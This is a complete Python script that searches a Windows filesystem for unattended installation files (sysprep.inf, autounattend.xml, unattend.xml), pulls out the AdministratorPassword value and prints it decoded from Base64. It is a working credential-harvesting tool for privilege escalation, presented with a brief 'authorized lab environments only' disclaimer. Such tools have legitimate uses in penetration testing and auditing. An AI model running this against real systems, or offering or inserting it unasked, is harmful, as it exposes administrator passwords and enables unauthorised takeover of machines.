#!/usr/bin/python3
"""
Extract administrator credentials from Windows unattended installation files.

This script recursively searches the Windows filesystem for common unattended
installation files such as sysprep.inf, autounattend.xml, and Unattend.xml.
When one of these files is found, the script looks for an AdministratorPassword
XML value, decodes it from Base64, and prints the decoded password.

This script is intended for authorized lab environments only.
"""

import os
import re
import base64


# Starting point for the filesystem search.
START_PATH = "C:\\"

# Common Windows unattended installation files that may contain credentials.
TARGET_FILES = {"sysprep.inf", "autounattend.xml", "unattend.xml"}

# Regex used to extract the value inside the AdministratorPassword XML block.
PASSWORD_REGEX = re.compile(
    r"<AdministratorPassword>.*?<Value>(.*?)</Value>",
    re.DOTALL | re.IGNORECASE
)


def is_target_file(filename):
    """
    Check whether a file is a known unattended installation file.

    Args:
        filename (str): The name of the file to check.

    Returns:
        bool: True if the file matches a known unattended installation file,
        False otherwise.
    """
    return filename.lower() in TARGET_FILES


def add_base64_padding(encoded_value):
    """
    Add missing Base64 padding characters if required.

    Base64 strings must have a length that is a multiple of 4. Some values
    found in unattended installation files may miss the final '=' padding
    characters, which can cause a decoding error.

    Args:
        encoded_value (str): The Base64 string to fix.

    Returns:
        str: The Base64 string with valid padding.
    """
    return encoded_value + "=" * ((4 - len(encoded_value) % 4) % 4)


def extract_encoded_password(content):
    """
    Extract the encoded administrator password from file content.

    The function searches for an AdministratorPassword XML block and returns
    the value stored inside the <Value> tag.

    Args:
        content (str): The content of the unattended installation file.

    Returns:
        str or None: The encoded password if found, otherwise None.
    """
    match = PASSWORD_REGEX.search(content)

    if match:
        return match.group(1).strip()

    return None


def decode_password(encoded_password):
    """
    Decode a Base64-encoded password.

    Args:
        encoded_password (str): The Base64-encoded password value extracted
        from the unattended installation file.

    Returns:
        str: The decoded password as readable text.
    """
    padded_password = add_base64_padding(encoded_password)
    decoded_bytes = base64.b64decode(padded_password)

    return decoded_bytes.decode("utf-8", errors="ignore")


def process_file(file_path):
    """
    Read an unattended installation file and extract a password if present.

    Args:
        file_path (str): The full path of the file to analyze.
    """
    print(f"[+] Found file: {file_path}")

    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as file:
            content = file.read()

        encoded_password = extract_encoded_password(content)

        if encoded_password:
            print(f"[+] Encoded password found: {encoded_password}")

            try:
                password = decode_password(encoded_password)
                print(f"[+] Decoded password: {password}")
            except Exception as error:
                print(f"[-] Failed to decode password: {error}")
        else:
            print(f"[-] No AdministratorPassword value found in: {file_path}")

    except PermissionError:
        print(f"[-] Permission denied: {file_path}")
    except Exception as error:
        print(f"[-] Error reading {file_path}: {error}")


def main():
    """
    Walk through the filesystem and process every matching unattended file.

    The search starts from START_PATH and recursively checks every file name
    against the TARGET_FILES list.
    """
    for root, _, files in os.walk(START_PATH):
        for filename in files:
            if is_target_file(filename):
                full_path = os.path.join(root, filename)
                process_file(full_path)


if __name__ == "__main__":
    main()
